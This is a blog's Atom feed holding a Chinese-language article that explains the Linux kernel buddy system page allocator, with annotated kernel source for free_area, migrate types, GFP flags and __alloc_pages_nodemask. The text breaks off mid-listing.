<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2022-07-06T19:02:52.861Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【OS.0x03】Linux Kernel 内存管理浅析 II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2022-07-06T19:02:52.861Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>在<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">上一篇文章</a>中笔者简要阐述了 Linux 内核当中内存的基本组织架构：页、区、节点，在本篇文章当中笔者将阐述内核中最<strong>基础</strong>的内存分配器——<strong>Buddy Systen</strong>（伙伴系统）</p><blockquote><p>通过读取 <code>/proc/buddyinfo</code> 可以获取当前系统中 buddy system 的详细信息</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>笔者的💻配置比较🚮，所以只有一个 node，非常抱歉…</p></blockquote></blockquote><blockquote><p>这篇文章其实很早就写了个框架了，但是后面一直没有来得及进行补完…（其实就是懒而已吧（恼））</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1 id="0x01-buddy-system-中的内存组织形式"><a href="#0x01-buddy-system-中的内存组织形式" class="headerlink" title="0x01.buddy system 中的内存组织形式"></a>0x01.buddy system 中的内存组织形式</h1><h2 id="zone-中的-free-area-结构体数组"><a href="#zone-中的-free-area-结构体数组" class="headerlink" title="zone 中的 free_area 结构体数组"></a>zone 中的 free_area 结构体数组</h2><p>前文中我们讲到，每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：<br>$$<br>2^{order}<br>$$<br>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张_Overview_：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>下面我们来解析 <code>free_area</code> 的具体结构，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="free-list：空闲页面双向链表"><a href="#free-list：空闲页面双向链表" class="headerlink" title="free_list：空闲页面双向链表"></a>free_list：空闲页面双向链表</h3><p>我们不难看出：free_area 的 free_list 字段便是用以存放指向空闲页面的指针，其通过 page 结构体的 <code>lru</code> 字段将 page 结构体连接成双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* 页缓存与匿名页 */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout 链表, 例如 active_list 便由</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock 保护。  </span></span><br><span class="line"><span class="comment"> * 有时会被页所有者作为常规链表使用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>page 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<strong>free_list 与 lru 链表都使用该字段</strong> 将页结构体组织为_双向链表_，即_一个页是不可能同时出现在 lru 链表与 buddy system 中的_</p><h4 id="迁移类型分链表"><a href="#迁移类型分链表" class="headerlink" title="迁移类型分链表"></a><em>迁移类型分链表</em></h4><p>在这里我们注意到free_area 中<strong>并非只有一个双向链表</strong>，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment"> * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment"> * a single pageblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_CMA</strong>：<code>Contiguous Memory Allocator</code>，即<strong>连续的物理内存</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES_：表示迁移类型的数目，_并不存在这一链表</em></li></ul><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="nr-free：空闲页面（块）计数"><a href="#nr-free：空闲页面（块）计数" class="headerlink" title="nr_free：空闲页面（块）计数"></a>nr_free：空闲页面（块）计数</h3><p>该字段记录了在当前 free_area 中的空闲页面块的数量，对于 free_area[0] 以外的 free_area 而言其单位并非是单个页框，而是以_内存块_为单位</p><h1 id="0x02-页的分配"><a href="#0x02-页的分配" class="headerlink" title="0x02.页的分配"></a>0x02.页的分配</h1><p>buddy system 提供了一组用以进行页面分配的接口，接下来笔者将以自底向上的方式进行源码分析</p><h2 id="一、GFP（get-free-page）标志位"><a href="#一、GFP（get-free-page）标志位" class="headerlink" title="一、GFP（get free page）标志位"></a>一、GFP（get free page）标志位</h2><blockquote><p>GFP标志位这一节基本上搬运自<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">这篇文章</a></p></blockquote><p>在 kernel memory allocation 中我们经常能见到 <code>gfp_t</code> 类型，其表示分配时的标志位，定义在 <code>include/linux/gfp.h</code> 中，大概有如下这些可用标志位：</p><ul><li><strong>内存管理区修饰符 (zone modifiers)</strong></li></ul><p>内存管理区修饰符主要描述从哪些内存管理区来分配内存</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区中分配内存</td></tr><tr><td align="left">__GFP_HIGNMEM</td><td align="left">从ZONE_HIGHMEM区中分配内存</td></tr><tr><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区中分配内存</td></tr><tr><td align="left">__GFP_MOVABLE</td><td align="left">内存规整时可以迁移或回收页面</td></tr></tbody></table><ul><li><strong>移动和替换修饰符(mobility and placement modifiers)</strong></li></ul><p>移动和替换修饰符主要表示分配出来的页面具有的迁移属性</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_RECLAIMABLE</td><td align="left">分配的内存页面可以回收</td></tr><tr><td align="left">__GFP_WRITE</td><td align="left">申请的页面会被弄成脏页</td></tr><tr><td align="left">__GFP_HARDWALL</td><td align="left">强制使用cpuset内存分配策略</td></tr><tr><td align="left">__GFP_THISNODE</td><td align="left">在指定的节点上分配内存</td></tr><tr><td align="left">__GFP_ACCOUNT</td><td align="left">kmemcg会记录分配过程</td></tr></tbody></table><ul><li><strong>水位修饰符 （watermark modifiers）</strong></li></ul><p>与水位线相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_ATOMIC</td><td align="left">高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td align="left">__GFP_HIGH</td><td align="left">分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td align="left">__GFP_MEMALLOC</td><td align="left">允许访问所有的内存</td></tr><tr><td align="left">__GFP_NOMEMALLOC</td><td align="left">不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><ul><li><strong>页面回收修饰符（reclaim modifiers)</strong></li></ul><p>与页面回收相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_IO</td><td align="left">启动物理I&#x2F;O传输</td></tr><tr><td align="left">__GFP_FS</td><td align="left">允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁</td></tr><tr><td align="left">__GFP_DIRECT_RECLAIM</td><td align="left">分配内存过程中可以使用直接内存回收</td></tr><tr><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">内存到达低水位时唤醒kswapd线程异步回收内存</td></tr><tr><td align="left">__GFP_RECLAIM</td><td align="left">表示是否可以直接内存回收或者使用kswapd线程进行回收</td></tr><tr><td align="left">__GFP_RETRY_MAYFAIL</td><td align="left">分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益</td></tr><tr><td align="left">__GFP_NOFAIL</td><td align="left">内存分配失败后无限制的重复尝试，知道分配成功</td></tr><tr><td align="left">__GFP_NORETRY</td><td align="left">直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL</td></tr></tbody></table><ul><li><strong>行为修饰符 (action modifiers)</strong></li></ul><p>与分配时的行为相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_NOWARN</td><td align="left">关闭内存分配过程中的WARNING</td></tr><tr><td align="left">__GFP_COMP</td><td align="left">分配的内存页面将被组合成复合页compound page</td></tr><tr><td align="left">__GFP_ZERO</td><td align="left">返回一个全部填充为0的页面</td></tr></tbody></table><ul><li><strong>组合类型标志(Useful GFP flag combinations)</strong></li></ul><p>前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用。</p><table><thead><tr><th align="left">flag</th><th align="left">element</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">GFP_ATOMIC</td><td align="left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td align="left">GFP_KERNEL</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td align="left">分配内存时可以被阻塞(即休眠)</td></tr><tr><td align="left">GFP_KERNEL_ACCOUNT</td><td align="left">GFP_KERNEL |__GFP_ACCOUNT</td><td align="left">和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录</td></tr><tr><td align="left">GFP_NOWAIT</td><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td align="left">GFP_NOIO</td><td align="left">__GFP_RECLAIM</td><td align="left">不需要启动任何的I&#x2F;O操作</td></tr><tr><td align="left">GFP_NOFS</td><td align="left">__GFP_RECLAIM |__GFP_IO</td><td align="left">不会有访问任何文件系统的操作</td></tr><tr><td align="left">GFP_USER</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td align="left">用户空间的进程分配内存</td></tr><tr><td align="left">GFP_DMA</td><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区分配内存</td></tr><tr><td align="left">GFP_DMA32</td><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区分配内存</td></tr><tr><td align="left">GFP_HIGHUSER</td><td align="left">GFP_USER | __GFP_HIGHMEM</td><td align="left">用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移</td></tr><tr><td align="left">GFP_HIGHUSER_MOVABLE</td><td align="left">GFP_HIGHUSER | __GFP_MOVABLE</td><td align="left">和GFP_HIGHUSER类似，但是页面可以迁移</td></tr><tr><td align="left">GFP_TRANSHUGE_LIGHT</td><td align="left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td align="left">透明大页的内存分配， light表示不进行内存压缩和回收</td></tr><tr><td align="left">GFP_TRANSHUGE</td><td align="left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td align="left">和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志</td></tr></tbody></table><h2 id="二、alloc-context-结构体：分配的上下文"><a href="#二、alloc-context-结构体：分配的上下文" class="headerlink" title="二、alloc_context 结构体：分配的上下文"></a>二、alloc_context 结构体：分配的上下文</h2><p>这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 用以保存在分配时涉及到的函数间传递的</span></span><br><span class="line"><span class="comment"> * 绝大部分的不可变的分配参数的结构体，</span></span><br><span class="line"><span class="comment"> * 包括 alloc_pages 函数族</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * nodemask, migratetype 与 highest_zoneidx 仅在</span></span><br><span class="line"><span class="comment"> * __alloc_pages_nodemask() 中被初始化一次，之后不再改变.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist, preferred_zone 与 highest_zoneidx 最初在</span></span><br><span class="line"><span class="comment"> * __alloc_pages_nodemask() 中为快速路径设置, 之后可能会在</span></span><br><span class="line"><span class="comment"> * __alloc_pages_slowpath() 中被改变. 其他所有的函数通过</span></span><br><span class="line"><span class="comment"> * 常量指针传递该结构体。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line"><span class="type">nodemask_t</span> *nodemask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line"><span class="type">int</span> migratetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * highest_zoneidx 表示分配请求中最高的可用 zone 的下标。</span></span><br><span class="line"><span class="comment"> * 由于 zone 的性质, 相较于 highest_zoneidx，</span></span><br><span class="line"><span class="comment"> * 在更低的 zone 上的内存会由 lowmem_reserve[highest_zoneidx] 保护。</span></span><br><span class="line"><span class="comment"> * 译注：就是水位线机制，不记得的回去看上一篇文章</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * highest_zoneidx 同样被回收/压缩使用以限制目标 zone，</span></span><br><span class="line"><span class="comment"> * 因为高于该下标的 zone 无法用于此分配请求</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">highest_zoneidx</span>;</span></span><br><span class="line"><span class="type">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们主要关注如下成员：</p><ul><li>zonelist</li></ul><p>该成员表示在<strong>这一次的分配上下文</strong>中，我们将要操作的 zone 的<strong>列表</strong>，其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span></span><br><span class="line"><span class="comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span></span><br><span class="line"><span class="comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span></span><br><span class="line"><span class="comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span></span><br><span class="line"><span class="comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span></span><br><span class="line"><span class="comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* 指向实际上的 zone 的指针 */</span></span><br><span class="line"><span class="type">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>该成员为一个 <code>zoneref</code> 类型的结构体，表示<strong>优先用来进行分配的 zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>布尔值，表示<strong>此次分配是否可能产生脏页</strong>（需要进行写回），通常分配需要写入的页会出现</p><h2 id="三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体"><a href="#三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体" class="headerlink" title="三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体"></a>三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体</h2><p>该函数是 buddy system 中用以进行页面分配的<strong>核心函数</strong>，所有的页面分配 API 都是基于该函数的封装，其需要传入的四个参数为：</p><ul><li><code>gfp_mask</code>：分配行为参数（可以参见 <a href="https://blog.csdn.net/choumin/article/details/109603011">这里</a>）</li><li><code>order</code>：分配的连续物理页框的阶</li><li><code>preferred_nid</code> 选取的节点的 id</li><li><code>nodemask</code>：</li></ul><p>返回值为分配的<strong>连续物理页</strong>中的第一张物理页的 <code>page</code> 结构体</p><blockquote><p>如果你已经不记得 page 结构体与物理页的页框号间的转换公式了，可以回去看<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">上一篇文章</a></p><p>当然，笔者比较好心（笑），这里直接给出计算公式，<code>mem_section</code> 结构体中的 <code>section_mem_map</code> 成员存储了其起始地址减掉其起始地址对应的物理页框的页框号的差值，该成员与 page 结构体间做<strong>指针差值运算</strong>便能获得 page 结构体对应的物理页框号：<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p></blockquote><p>这是一张_Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="从知乎偷的.png"></p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_nodemask</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class"><span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line"><span class="type">gfp_t</span> alloc_mask; <span class="comment">/* 实际用于分配的 gfp_t ，这是一个int类型的整型*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们假定 order 的值在一些地方是正常的，</span></span><br><span class="line"><span class="comment"> * 因此若请求超出范围则提前退出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;</span><br><span class="line">WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gfp_mask &amp;= gfp_allowed_mask;</span><br><span class="line">alloc_mask = gfp_mask;</span><br><span class="line"><span class="keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, 